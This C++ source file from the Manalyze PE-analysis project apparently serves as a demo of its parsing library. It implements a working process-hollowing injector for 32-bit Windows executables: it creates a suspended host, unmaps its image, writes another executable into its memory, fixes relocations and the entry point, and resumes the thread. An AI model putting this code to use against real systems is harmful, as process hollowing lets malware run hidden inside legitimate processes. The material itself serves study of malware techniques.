/*
    This file is part of Manalyze.

    Manalyze is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Manalyze is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with Manalyze.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <string>
#include <iostream>
#include <Windows.h>
#include <boost/filesystem.hpp>

#include <manape/pe.h>

namespace bfs = boost::filesystem;

typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_type)(HANDLE, PVOID);

/**
 *	@brief	Resolved the NtUnmapViewOfSection function from ntdll.dll.
 *
 *	@return	A function pointer to NtUnmapViewOfSection.
 */
NtUnmapViewOfSection_type resolve_unmap()
{
	HMODULE h = ::GetModuleHandle("ntdll.dll");
	if (h == INVALID_HANDLE_VALUE)
	{
		std::cerr << "Could not get a handle to ntdll.dll." << std::endl;
		return nullptr;
	}
	return reinterpret_cast<NtUnmapViewOfSection_type>(::GetProcAddress(h, "NtUnmapViewOfSection"));
}

// ----------------------------------------------------------------------------

/**
 *	@brief	This function performs the clean up after the process hollowing
 *			attempt (closing the handles, plus killing the zombie process in
 *			case of failure).
 */
void process_hollowing_cleanup(const ::STARTUPINFO& si, const ::PROCESS_INFORMATION& pi, bool terminate_process = true)
{
	if (si.hStdInput != INVALID_HANDLE_VALUE) ::CloseHandle(si.hStdInput);
	if (si.hStdOutput != INVALID_HANDLE_VALUE) ::CloseHandle(si.hStdOutput);
	if (si.hStdError != INVALID_HANDLE_VALUE) ::CloseHandle(si.hStdError);
	if (pi.hProcess != INVALID_HANDLE_VALUE && terminate_process) ::TerminateProcess(pi.hProcess, 0);
	if (pi.hProcess != INVALID_HANDLE_VALUE)  ::CloseHandle(pi.hProcess);
	if (pi.hThread != INVALID_HANDLE_VALUE)::CloseHandle(pi.hThread);
}

// ----------------------------------------------------------------------------

/**
 * @brief	Checks whether the input executable can be relocated (in the sense of ASLR) in the host.
 * 
 * Two things are checked:
 * 1/ That the input PE is ASLR compatible.
 * 2/ That the executable and the host have different base addresses or the target PE has ASLR enabled.
 * 
 * @param	pe	The executable to test.
 * @param	t	The host executable.
 * 
 * @return	Whether the executable can be injected anywhere.
 */
bool relocation_possible(const mana::PE& pe, const mana::PE& target)
{
	auto characteristics = *nt::translate_to_flags(pe.get_image_optional_header()->DllCharacteristics, nt::DLL_CHARACTERISTICS);
	if(std::find(characteristics.begin(), characteristics.end(), "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE") ==
		characteristics.end())
	{
		return false;  // Input is not ASLR compatible. Give up.
	}

	// Not optimal code, the intent is to demonstrate translate_to_flags usage.
	// In the real world, just check if 
	// target.get_image_optional_header()->DllCharacteristics && IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE == 0
	characteristics = *nt::translate_to_flags(target.get_image_optional_header()->DllCharacteristics, nt::DLL_CHARACTERISTICS);
	if (std::find(characteristics.begin(), characteristics.end(), "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE") ==
		characteristics.end())
	{
		return true;  // Input and target are ASLR compatible, relocation is possible and will be necessary.
	}
	else {  // Relocation is needed only if the target's ImageBase is different from the input's.
		return pe.get_image_optional_header()->ImageBase != target.get_image_optional_header()->ImageBase;
	}
}

// ----------------------------------------------------------------------------

/*
 *	@brief	Returns the Memory Protection constant associated with the 
 *			section's permissions.
 *
 *	@param	s The section whose permissions are required.
 *
 *	@return	One of the constants from
 *			https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
 */
DWORD perms_from_characteristics(mana::pSection& s)
{
	DWORD perms = 0;
	int readable = 0;
	int writable = 0;
	int executable = 0;

	// perm_lookup[readable][writable][executable] to obtain the right memory protection contant.
	DWORD perm_lookup[2][2][2] = 
	{
		{
			{ PAGE_NOACCESS,	PAGE_READONLY },
			{ PAGE_READWRITE,	PAGE_READWRITE } // Pages cannot be WRITE_ONLY
		},
		{
			{ PAGE_EXECUTE,				PAGE_EXECUTE_READ },
			{ PAGE_EXECUTE_READWRITE,	PAGE_EXECUTE_READWRITE } // Pages cannot be EXECUTE_WRITE
		}
	};

	auto characteristics = s->get_characteristics();
	auto flags = *nt::translate_to_flags(s->get_characteristics(), nt::SECTION_CHARACTERISTICS);
	if (std::find(flags.begin(), flags.end(), "IMAGE_SCN_MEM_EXECUTE") != flags.end()) {
		executable = 1;
	}
	if (std::find(flags.begin(), flags.end(), "IMAGE_SCN_MEM_READ") != flags.end()) {
		readable = 1;
	}
	if (std::find(flags.begin(), flags.end(), "IMAGE_SCN_MEM_WRITE") != flags.end()) {
		writable = 1;
	}
	return perm_lookup[readable][writable][executable];
}

// ----------------------------------------------------------------------------

/**
 *	@brief	This function verifies that the input files can be used to perform
 *			process hollowing.
 *
 *	@param	target		The PE into which an executable will be injected.
 *	@param	to_inject	The PE to inject.
 *
 *	@return	Whether the process hollowing can be attempted.
 */
bool check_prerequisites(mana::PE& target, mana::PE& to_inject)
{
	if (!target.is_valid() || !target.get_image_optional_header() ||
		!to_inject.is_valid() || !to_inject.get_image_optional_header())
	{
		std::cerr << "The input files don't appear to be valid!" << std::endl;
		return false;
	}

	if (target.get_architecture() != mana::PE::x86 || to_inject.get_architecture() != mana::PE::x86)
	{
		std::cerr << "This program only works on 32 bit executables!" << std::endl;
		return false;
	}

	if (target.get_image_optional_header()->Subsystem != to_inject.get_image_optional_header()->Subsystem)
	{
		std::cerr << "The two executables need to have the same subsystem!" << std::endl;
		return false;
	}
	return true;
}

// ----------------------------------------------------------------------------

/**
 *	@brief	This function maps the sections of the injected process into the host.
 *	
 *	Each section is copied to its virtual address in the remote process, then its
 *	permissions are set to what they should be.
 *	
 *	@param	pe The executable to inject.
 *	@param	target The host executable.
 *	@param	pi The information related to the spawned host process.
 *	@param	base_address The base address at which the PE image will be placed.
 *	
 *	@return	Whether the sections were mapped successfully.
 */
bool map_sections(const mana::PE& pe, const mana::PE& target, const ::PROCESS_INFORMATION& pi, boost::uint8_t* base_address)
{
	BOOL res;
	auto sections = pe.get_sections();
	for (auto it = sections->begin() ; it != sections->end() ; ++it)
	{
		if ((*it)->get_size_of_raw_data() == 0) {
			continue; // Ignore empty sections such as .textbss, etc.
		}

		auto destination_address = base_address + (*it)->get_virtual_address();
		auto section_bytes = (*it)->get_raw_data();
		res = ::WriteProcessMemory(pi.hProcess,						// Target process
								   destination_address,				// Address to write at
								   &(*section_bytes)[0],			// The bytes of the section
								   (*it)->get_size_of_raw_data(),	// The number of bytes to copy
								   nullptr);						// Ignore the number of bytes written
		if (res == false)
		{
			std::cerr << "Could not write section " << *(*it)->get_name() << " in " << *target.get_path() << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
			return false;
		}

		// Fix the page's permissions
		DWORD ignored;
		auto perms = perms_from_characteristics(*it);
		res =::VirtualProtectEx(pi.hProcess,				// Target process
								destination_address,		// The address at which permissions should be changed
								(*it)->get_virtual_size(),	// The size of the region to modify
								perms,						// New permissions
								&ignored);					// Old permissions (ignored)
		if (res == false)
		{
			std::cerr << "Could not change " << *(*it)->get_name() << "'s permissions in " << *target.get_path() << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
			return false;
		}
	}
	return true;
}

// ----------------------------------------------------------------------------

/**
 * @brief	Obtains the address at which the target process was loaded.
 * 
 *	@param	pi The information related to the spawned host process.
 *	@param	destination The variable into which the address will be stored.
 *	
 *	@return Whether the function succeeded.
 */
bool get_remote_imagebase(const PROCESS_INFORMATION& pi, PVOID destination)
{
	::CONTEXT context;
	BOOL res;
	context.ContextFlags = CONTEXT_FULL; // Retrieve the whole thread context.
	res = ::GetThreadContext(pi.hThread, &context);
	if (res == false)
	{
		std::cerr << "Could not retrieve the context of the main thread! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}
	res = ::ReadProcessMemory(pi.hProcess,									// Target process
							  reinterpret_cast<PVOID>((context.Ebx + 8)),	// EBX + 8 = PEB.ImageBaseAddress
							  destination,									// The new value
							  sizeof(PVOID),								// The size of the value to write
							  nullptr);										// Ignore the number of bytes read
	if (!res)
	{
		std::cerr << "Could not read the target's ImageBase! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}
	return true;
}

// ----------------------------------------------------------------------------

/**
 *	@brief	This function applies a relocation at a single point in the program.
 *	
 *	It consists in reading the remote value, rebasing it relatively to the new ImageBase,
 *	and updating it in the host process.
 *	
 *	@param	pi The information related to the spawned host process.
 *	@param	target_address The address of the value to update.
 *	@param	delta The difference between the intended and the default ImageBase.
 */
bool do_single_relocation(const ::PROCESS_INFORMATION& pi, PVOID target_address, boost::int32_t delta)
{
	boost::int32_t remote_value;
	auto res = ::ReadProcessMemory(pi.hProcess, target_address, &remote_value, 4, nullptr);
	if (res == false)
	{
		std::cerr << "Could not read the host's memory at " << target_address << "!" << std::endl;
		return false;
	}
	remote_value += delta;
	res = ::WriteProcessMemory(pi.hProcess, target_address, &remote_value, 4, nullptr);
	if (res == false)
	{
		std::cerr << "Could not apply the relocation at " << target_address << "!" << std::endl;
		return false;
	}
	return true;
}

// ----------------------------------------------------------------------------

/**
 * @brief	This function applies relocations after the PE image has been mapped.
 * 
 * @param	pe				The injected executable.
 * @param	pi				The information related to the spawned host process.
 * @param	base_address	The actual base address of the mapped image.
 */
bool apply_relocations(const mana::PE& pe, const ::PROCESS_INFORMATION& pi, boost::uint8_t* base_address)
{
	auto relocs = pe.get_relocations();
	boost::int32_t delta = reinterpret_cast<boost::uint32_t>(base_address - pe.get_image_optional_header()->ImageBase);

	// For each relocation, get the remote address to patch and rebase the value located there.
	for (auto it = relocs->begin() ; it != relocs->end() ; ++it)
	{
		for (auto reloc : (*it)->TypesOffsets)
		{
			if (reloc >> 12 == IMAGE_REL_BASED_HIGHLOW)
			{
				PVOID target_address = base_address + (*it)->PageRVA + (reloc & 0x0FFF);
				do_single_relocation(pi, target_address, delta);
			}
			else if (reloc >> 12 == IMAGE_REL_BASED_ABSOLUTE) { // Padding relocation block.
				continue;
			}
			else
			{
				std::cerr << "Warning: unsupported relocation type! (" << *nt::translate_to_flag(reloc >> 12, nt::BASE_RELOCATION_TYPES) 
						  << ")" << std::endl;
			}
		}
	}

	// Also update the ImageBase in the PE header (the offset is only true for x86 executables):
	PVOID target_address = base_address + (pe.get_dos_header()->e_lfanew) + 4 + 0x14 + 0x1C;
	do_single_relocation(pi, target_address, delta);

	return true;
}

// ----------------------------------------------------------------------------

/**
 *	@brief	Updates the spawned process' start address by patching the value contained 
 *			in its EAX register.
 *			
 *	@param	pe	The executable to inject.
 *	@param	pi	The information related to the spawned host process.
 *	@param	base_address The address at which the image was loaded.
 *	
 *	@return	Whether the operation was successful.
 */
bool patch_ep(const mana::PE& pe, const ::PROCESS_INFORMATION& pi, boost::uint8_t* base_address)
{
	::CONTEXT context;
	BOOL res;
	context.ContextFlags = CONTEXT_FULL; // Retrieve the whole thread context.
	res = ::GetThreadContext(pi.hThread, &context);
	if (res == false)
	{
		std::cerr << "Could not retrieve the context of the main thread! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}
	context.Eax = reinterpret_cast<DWORD>(base_address + pe.get_image_optional_header()->AddressOfEntryPoint);
	res = ::SetThreadContext(pi.hThread, &context);
	if (res == false)
	{
		std::cerr << "Could not update the context of the main thread! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}

	// If both processes are ASLR compatible, we're overwriting with the same value (but that's okay).
	res = ::WriteProcessMemory(pi.hProcess,									// Target process
							   reinterpret_cast<PVOID>((context.Ebx + 8)),	// EBX + 8 = PEB.ImageBaseAddress
							   &base_address,								// The new value (possible conversion from uint64 to uint32 here)
							   sizeof(PVOID),								// The size of the value to write
							   nullptr);									// Ignore the number of bytes written
	if (res == false)
	{
		std::cerr << "Could not write the new base address in the target's PEB! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}
	return true;
}

// ----------------------------------------------------------------------------

bool process_hollowing(std::string to_inject, std::string target)
{
	auto working_directory = bfs::path(target).parent_path();
	::STARTUPINFO si;
	::PROCESS_INFORMATION pi;
	::memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	
	// Assert that the PE provided are valid.
	mana::PE pe(to_inject);
	mana::PE t(target);
	if (!check_prerequisites(t, pe)) {
		return false;
	}

	// Create a suspended instance of the target process.
	BOOL res = ::CreateProcess(target.c_str(),						// The path to the process to create
							   nullptr,								// No command line
							   nullptr,								// No process attributes
							   nullptr,								// No thread attributes
							   false,								// No handle inheritance
							   CREATE_SUSPENDED,					// Suspend the created process
							   nullptr,								// No environment
							   working_directory.string().c_str(),	// Use the target's working directory
							   &si,									
							   &pi);

	if (res == 0)
	{
		std::cerr << "Could not start " << target << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		return false;
	}

	// Depending on whether the input file is ASLR-compatible, inject it at it's preferred base or at the
	// host process' preferred base.
	boost::uint8_t* destination_address = nullptr;
	if (relocation_possible(pe, t)) {
		get_remote_imagebase(pi, &destination_address);
	}
	else {
		// Safe because we're working on x86 executables.
		destination_address = reinterpret_cast<boost::uint8_t*>(pe.get_image_optional_header()->ImageBase);
	}

	// Unmap the section corresponding to the address of to_inject's EP.
	NtUnmapViewOfSection_type NtUnmapViewOfSection = resolve_unmap();
	if (NtUnmapViewOfSection == nullptr)
	{
		std::cerr << "Unable to resolve NtUnmapViewOfFile!" << std::endl;
		process_hollowing_cleanup(si, pi);
		return false;
	}	
	NtUnmapViewOfSection(pi.hProcess, destination_address);

	// Allocate memory in the remote executable.
	PVOID mem = ::VirtualAllocEx(pi.hProcess,									// Target process
								 destination_address,							// Requested starting address
								 pe.get_image_optional_header()->SizeOfImage,	// Requested size
								 MEM_COMMIT | MEM_RESERVE,						// Allocation type
								 PAGE_READWRITE);								// Mark the page as RW
	if (mem == nullptr)
	{
		if (::GetLastError() == ERROR_INVALID_ADDRESS) {
			std::cerr << "Not enough room at the requested address. Please try again." << std::endl;
		}
		else {
			std::cerr << "Could not allocate memory in " << target << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		}
		process_hollowing_cleanup(si, pi);
		return false;
	}

	// Copy the PE header
	auto bytes = pe.get_raw_bytes(pe.get_image_optional_header()->SizeOfHeaders);

	res = ::WriteProcessMemory(pi.hProcess,					// Target process
							   destination_address,			// Address to write at
							   &(*bytes)[0],				// The bytes of the PE header
							   bytes->size(),				// The number of bytes to copy
							   nullptr);					// Ignore the number of bytes written
	if (res == 0)
	{
		std::cerr << "Could not write the PE header in " << target << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		process_hollowing_cleanup(si, pi);
		return false;
	}

	// Map the sections and update the process' entry point.
	if (!map_sections(pe, t, pi, destination_address) || !patch_ep(pe, pi, destination_address))
	{
		process_hollowing_cleanup(si, pi);
		return false;
	}

	// Apply relocations if needed.
	if (relocation_possible(pe, t)) {
		apply_relocations(pe, pi, destination_address);
	}

	// Fix the PE header's permissions
	DWORD ignored;
	res =::VirtualProtectEx(pi.hProcess,													// Target process
							destination_address,											// The address at which permissions should be changed
							pe.get_image_optional_header()->SizeOfHeaders,					// The size of the region to modify
							PAGE_READONLY,													// New permissions
							&ignored);														// Old permissions (ignored)
	if (res == 0)
	{
		std::cerr << "Could not change the PE header's permissions in " << target << "! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		process_hollowing_cleanup(si, pi);
		return false;
	}

	// Resume the main thread.
	res = ::ResumeThread(pi.hThread);
	if (res == -1)
	{
		std::cerr << "Could not resume the main thread! (0x" << std::hex << ::GetLastError() << ")." << std::endl;
		process_hollowing_cleanup(si, pi);
		return false;
	}

	process_hollowing_cleanup(si, pi, false); // Don't terminate the process
	return true;
}

// ----------------------------------------------------------------------------

int main(int argc, char** argv)
{
	if (argc != 3)
	{
		std::cerr << "Usage: " << argv[0] << " to_inject host_process" << std::endl;
		return 1;
	}

	std::string to_inject = argv[1];
	std::string target = argv[2];

	if (!bfs::exists(to_inject) || !bfs::exists(target))
	{
		std::cerr << "The input files could not be found!" << std::endl;
		return ERROR_FILE_INVALID;
	}
	if (process_hollowing(to_inject, target)) {
		std::cout << "Done!" << std::endl;
	}
	return 0;
}
